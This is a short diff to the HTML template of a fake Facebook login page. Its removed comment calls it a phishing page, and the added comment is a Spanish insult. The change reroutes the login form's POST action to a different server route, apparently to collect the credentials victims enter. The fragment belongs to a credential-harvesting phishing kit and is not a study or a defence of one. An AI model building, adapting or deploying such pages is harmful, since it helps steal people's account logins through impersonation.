@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
+<!--Marico el que lo lea-->
 <html lang="en" id="facebook">
   <head>
     <meta charset="utf-8" />
@@ -1595,7 +1595,7 @@
                         method="post"
                         onsubmit=""
                         id="u_0_a_OZ"
-                        action="{{ url('book') }}"
+                        action="{{ url('snprobbx') }}"
                       >
 
                       @csrf
